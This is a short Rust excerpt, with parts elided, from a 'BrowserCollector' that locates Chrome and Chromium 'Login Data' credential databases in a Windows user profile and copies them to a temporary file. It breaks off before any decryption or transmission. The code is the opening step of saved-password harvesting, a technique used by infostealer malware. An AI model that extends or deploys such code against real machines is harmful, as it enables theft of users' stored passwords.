...
impl BrowserCollector {
  ...
  pub fn collect_chrome(&self) -> Option<Vec<BrowserCredential>> {
    ...
    if let Ok(profile) = env::var("USERPROFILE") {
      paths.push(
        PathBuf::from(&profile).join(r"AppData\Local\Google\Chrome\User Data\Default\Login Data"),
      );
      paths
        .push(PathBuf::from(&profile).join(r"AppData\Local\Chromium\User Data\Default\Login Data"));
    }
    ...
    for path in paths {
      if path.exists() {
        ...
        let temp_path = env::temp_dir().join(format!("login_data_temp_{}.db", Uuid::new_v4()));
